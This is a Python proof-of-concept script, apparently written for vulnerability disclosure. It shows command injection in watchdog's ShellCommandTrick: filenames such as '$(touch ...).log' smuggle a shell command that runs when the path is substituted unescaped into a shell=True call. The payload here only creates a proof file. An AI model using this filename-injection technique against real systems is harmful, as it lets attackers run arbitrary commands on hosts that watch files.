#!/usr/bin/env python3
"""
Watchdog ShellCommandTrick — Command Injection via Filename PoC
Package: watchdog
File:    watchdog/tricks/__init__.py, lines 130-131
Sink:    subprocess.Popen(command, shell=True)
Source:  watch_src_path = event.src_path (filesystem filename)

ShellCommandTrick substitutes the triggered file's full path into the shell
command template via Template.safe_substitute(). Because the substitution
performs no shell-escaping, an attacker who can create a file whose name
contains shell metacharacters can inject arbitrary commands.

Key: Template.safe_substitute() is not shell-safe — it only prevents
KeyError on missing keys, it does NOT escape shell metacharacters.

Vulnerable code path:
  ShellCommandTrick.on_any_event(event)
    -> context = {"watch_src_path": event.src_path, ...}
    -> command = Template(shell_command).safe_substitute(**context)   # no escaping
    -> subprocess.Popen(command, shell=True)                          # injection fires

Attack vector:
  Attacker creates a file with name containing $() command substitution.
  Linux allows any characters in filenames except NUL and '/'.
  The full src_path (dir + filename) is substituted into the template.
  When the shell evaluates the substituted command, $() executes.
"""

import os
import time
import tempfile
import subprocess
import sys

from string import Template

PROOF_FILE = '/tmp/watchdog_poc_pwned'

# --- Stage 1: Direct substitution reproducer ---
# Simulates exactly what ShellCommandTrick does on lines 130-131.
# The src_path contains a $() payload embedded in the path.
# This works because $() executes even inside double-quoted strings.

print('=' * 60)
print('STAGE 1: Direct substitution reproducer')
print('=' * 60)

shell_command = 'echo "File changed: ${watch_src_path}"'

# Simulated src_path: directory is benign, filename contains $() payload.
# The filename itself is: $(touch /tmp/watchdog_poc_pwned).log
# Filename characters: $, (, t, o, u, c, h, space, /, t, m, p, /, ... none are '/'
# Wait — /tmp/watchdog_poc_pwned HAS slashes, but those are inside $(),
# which the shell evaluates. Only the OS path parsing treats '/' as separator.
# The OS path here is a SIMULATED string — no file is actually created.
simulated_src_path = '/tmp/watched/$(touch ' + PROOF_FILE + ').log'

context = {
    'watch_src_path': simulated_src_path,
    'watch_dest_path': '',
    'watch_event_type': 'created',
    'watch_object': 'file',
}

command = Template(shell_command).safe_substitute(**context)
print(f'[*] Template:           {shell_command}')
print(f'[*] Simulated src_path: {simulated_src_path}')
print(f'[*] After substitution: {command}')
print()

# Execute exactly as ShellCommandTrick does
subprocess.Popen(command, shell=True).wait()

if os.path.exists(PROOF_FILE):
    print(f'[+] SUCCESS: $() command substitution fired — {PROOF_FILE} created')
    os.remove(PROOF_FILE)
else:
    print('[-] Proof file not created — check that /bin/sh supports $() substitution')

# --- Stage 2: End-to-end via watchdog Observer ---
# Creates a real file with a $() payload in its NAME (no '/' in the name itself).
# The watched directory path provides the '/' separators before the filename.
# When watchdog triggers, the full path is substituted and $() executes.

print()
print('=' * 60)
print('STAGE 2: End-to-end via ShellCommandTrick + watchdog Observer')
print('=' * 60)

try:
    from watchdog.observers import Observer
    from watchdog.tricks import ShellCommandTrick
except ImportError:
    print('[-] watchdog not installed — skipping Stage 2')
    print('    Install with: pip install watchdog')
    sys.exit(0)

# The proof file for Stage 2 uses a relative name since $() can't
# reference absolute paths via the filename (filenames can't contain '/').
# poc_proof will be created in CWD.
STAGE2_PROOF = os.path.join(os.getcwd(), 'watchdog_stage2_proof')

with tempfile.TemporaryDirectory() as watch_dir:
    handler = ShellCommandTrick(
        # Template uses unquoted ${watch_src_path} — most real-world usage
        shell_command='echo changed: ${watch_src_path}',
        patterns=['*'],
        wait_for_process=True,
    )

    observer = Observer()
    observer.schedule(handler, watch_dir, recursive=False)
    observer.start()

    print(f'[*] Watching:  {watch_dir}')
    print(f'[*] Template:  echo changed: ${{watch_src_path}}')
    print()

    # Filename: $(touch watchdog_stage2_proof).log
    # The filename contains NO '/' so Python open() and the OS can create it.
    # The watched dir provides the path prefix.
    # When $() fires, 'touch watchdog_stage2_proof' runs in CWD.
    malicious_name = '$(touch watchdog_stage2_proof).log'
    malicious_path = os.path.join(watch_dir, malicious_name)

    print(f'[*] Creating file with malicious name: {repr(malicious_name)}')
    open(malicious_path, 'w').close()
    print(f'[*] Full src_path watchdog will see: {malicious_path}')
    print(f'[*] After substitution: echo changed: {malicious_path}')
    print()

    time.sleep(2)  # let observer pick up and process the event

    observer.stop()
    observer.join()

if os.path.exists(STAGE2_PROOF):
    print(f'[+] SUCCESS: End-to-end injection confirmed.')
    print(f'    Proof file created by ShellCommandTrick: {STAGE2_PROOF}')
    os.remove(STAGE2_PROOF)
else:
    print('[-] Stage 2 proof file not found.')
    print('    Try increasing sleep time or confirm watchdog version supports inotify.')
